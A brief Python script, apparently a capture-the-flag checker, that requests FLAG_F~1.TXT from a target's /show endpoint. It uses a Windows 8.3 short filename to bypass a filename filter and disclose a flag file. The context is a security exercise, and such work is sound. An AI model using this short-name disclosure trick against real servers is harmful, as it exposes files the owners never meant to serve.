import requests
import sys

if len(sys.argv) < 3:
    print("Usage: check.py [ip] [port]")

r = requests.get("http://%s:%d/show?path=FLAG_F~1.TXT" % (sys.argv[1], int(sys.argv[2])))
print(r.content)
